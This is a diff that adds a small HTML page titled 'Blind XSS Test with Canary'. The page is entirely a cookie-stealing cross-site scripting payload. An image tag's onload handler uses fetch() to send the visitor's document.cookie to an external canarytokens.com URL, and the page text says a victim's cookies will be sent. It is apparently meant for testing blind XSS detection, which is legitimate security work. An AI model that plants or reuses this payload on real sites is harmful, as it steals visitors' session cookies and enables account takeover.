@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Blind XSS Test</title>
+</head>
+<body>
+    <h1>Blind XSS Test with Canary</h1>
+    <p>If you are a victim, your cookies will be sent to Canary.</p>
+
+    <!-- XSS Trigger -->
+    <img src="http://canarytokens.com/tags/traffic/b2tfmveyrurze5bhvphvs3rg8/submit.aspx?wsop_contact_us=htmlimg" 
+        onload="fetch('http://canarytokens.com/tags/traffic/b2tfmveyrurze5bhvphvs3rg8/submit.aspx?wsop_contact_us=htmlimg&cookies=' + encodeURIComponent(document.cookie))" />
+    
+</body>
+</html>
